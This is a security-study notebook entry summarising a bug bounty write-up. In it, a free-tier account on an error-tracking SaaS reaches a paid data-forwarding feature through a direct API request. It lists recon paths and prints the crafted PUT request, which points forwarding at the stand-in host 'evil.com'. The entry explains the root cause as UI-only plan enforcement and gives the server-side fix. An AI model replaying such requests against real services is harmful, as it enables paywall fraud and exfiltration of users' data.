# Case Study — Plan Restriction Bypass (Free Tier → Paid Features)

> **Original write-up:** [Medium — Abhi Sharma (T3CH)](https://medium.com/h7w/how-i-earned-469-bounty-bypassing-plan-restriction-58f6d3120b6e)
> **Target:** [[10-Targets/Sentry]] (Sentry — مذكور باسم مستعار ExamenTry)
> **The one principle behind everything:** [[03-Web-Vulnerabilities/temp.md]] — two components interpreting the same data differently.

---

## TL;DR

Free-tier account → **data forwarding (paid plan) settings** on ExamenTry (error-tracking SaaS) via a direct crafted API request. The UI hides the feature; the backend never enforces the plan. No privilege change, no headers — just a hand-made `PUT` request. $469 bounty.

---

## The Chain (foundation → application)

### 1) The false assumption to attack
The developer enforced the paywall **only in the UI**: if the dashboard doesn't show the feature, "the user can't reach it."
- **Foundation:** [[07-CheatSheets/Input-Validation.md#Client-Side vs Server-Side|Client-Side vs Server-Side]] + [[03-Web-Vulnerabilities/Methodology/Access Control Testing Methodology.md#Never Trust Client-Controlled Data|Never Trust Client-Controlled Data]] — hiding a button ≠ enforcing a restriction. The UI is client-side; access control must live server-side.

### 2) How he reached the URL/API — the recon behind it
The write-up doesn't spell the recon out, but the payload itself reveals how it was found. Three realistic paths:

1. **From the UI during a trial/browsing** — the path convention is standard for monitoring SaaS: `/settings/projects/{project}/plugins/{plugin}/`. Once you know one project, you can guess the path for any plugin. The report even hints the settings *page* exists in the UI (it's what triggers the "paid trial" prompt).
2. **From the Network tab / Burp Proxy** — while browsing the paid/trial account, the SPA fires API calls to `/api/0/projects/{org}/{project}/plugins/splunk/`. Record the request → replay it on the free account.
3. **From the JS bundles** — SPA routes and endpoints live in JavaScript files. Searching for `plugins`, `forwarding`, `splunk` reveals hidden API paths.

> **The real point:** the route exists on the server whether or not the UI hides it. Once you know the path convention, you can reach it directly.
> - **Foundation:** [[04-Recon/Discovering Hidden Content/Methodology.md|Discovering Hidden Content]] + [[04-Recon/Web Spidering/Intro.md|Web Spidering]] + [[07-CheatSheets/Recon.md#JavaScript Enumeration|JS Enumeration]].

### 3) Crafted URL — direct navigation
`https://yoursubdomain.examentry.io/settings/projects/<project>/plugins/splunk/` loads the data-forwarding settings page for a **free-tier** account, bypassing the UI paywall.
- **Foundation:** [[03-Web-Vulnerabilities/Access control vulnerabilities/Access Control Testing Methodology.md|Access Control Testing]] — "If I can't click it, can I still *request* it?" ([[02-Web Architecture/Anatomy of a Web Request.md|Anatomy of a Web Request]] — the UI is just a front-end to the same endpoint).

### 4) Crafted API request — the real control surface
The settings are writeable via a direct `PUT /api/0/projects/<org>/<project>/plugins/splunk/` with a JSON body (splunk `instance`, `index`, `source`, `token`).
- **Foundation:** [[03-Web-Vulnerabilities/Methodology/Access Control Testing Methodology.md#Build the Minimum Request|Build the Minimum Request]] — the endpoint is what matters, not the button that calls it. Same endpoint the paid UI uses, reached without the plan check.
- **Tool note:** [[11-Infrastructure/Splunk]] — the body values configure the destination (`instance` = Splunk server URL, `index` = data store, `token` = auth key).

### 5) Payload / request
```
PUT /api/0/projects/dd-0n/nodecf/plugins/splunk/ HTTP/2
Host: us.examentry.io
...

{"instance":"https://evil.com","index":"mains","source":"examentry","token":"fdvfdvdfsvdfvdf"}
```

### 6) The check that was missing
Plan-gated features must be validated **server-side on every request** (e.g., a subscription check in the endpoint handler). Here the endpoint trusted the UI to not call it. That's the entire vulnerability.

---

## Concept Mapping

- **Vulnerability class:** Vertical access control / **privilege escalation via plan tier** — free-tier user performing an action only higher-tier subscribers should do.
  → [[03-Web-Vulnerabilities/Access control vulnerabilities/Basic Concepts/Access Control Types.md#Vertical access control|Access Control Types]]
- **Root cause:** Missing authorization check on the server — security-through-UI-hiding, the same "client-side check ≠ security" trap.
  → [[07-CheatSheets/Input-Validation.md#Client-Side vs Server-Side|Client-Side vs Server-Side]]
- **Testing mindset:** Given a paid feature, ask "what URL/API does it call?" — then call it directly with a free account.
  → [[03-Web-Vulnerabilities/Methodology/Access Control Testing Methodology.md#Observe → Hypothesize → Test|Observe → Hypothesize → Test]] ([[02-Web Architecture/Anatomy of a Web Request.md|Trust Boundary]]).
- **Target:** [[10-Targets/Sentry]]
- **Tool:** [[11-Infrastructure/Splunk]]

---

## New Techniques

> Skills in this write-up the repo doesn't document explicitly yet.

1. **Plan/feature-gating as an access-control target** — subscription tiers are vertical privilege levels. Test with a free account against the *paid* feature's endpoints (Burp: identify the premium feature's network request, replay it on the free tier).
2. **UI-hiding ≠ restriction** — when a feature is missing from the dashboard, don't assume it's gone; assume the endpoint still exists and only the *button* is hidden. Bookmark/record premium feature requests from a paid account if you have access, or guess from JS bundles.
3. **`/settings/...` deep-link + `/api/0/...` REST surface** — the settings page is the SPA; the REST API is the real control surface. Test both paths for the same feature.
4. **Path convention = recon** — standard SaaS structures (`settings/projects/{project}/plugins/{plugin}`) let you predict endpoints for features you can't see.

---

## Key Takeaways

1. **Never gate access by hiding UI** — a direct request still reaches the endpoint. Enforce on the server, per-request.
2. **The API, not the page, is the boundary** — for any paid feature: find the underlying request, send it with the lowest-privilege account.
3. **One check missing = the whole tier bypassed** — the fix is a single server-side subscription check; the bug was its absence.
4. **Reuse the app's own patterns** — the endpoint URL shape (`/plugins/<tool>/`) and API (`/api/0/projects/...`) come from the app itself, like the site-map-as-wordlist lesson.
5. **JS files and network tab are the map** — when the UI hides a feature, the path still lives in the JS bundle and in the requests the SPA would make.

---

## References

- [How I Earned $469 Bounty: Bypassing Plan Restriction — Abhi Sharma (Medium)](https://medium.com/h7w/how-i-earned-469-bounty-bypassing-plan-restriction-58f6d3120b6e)
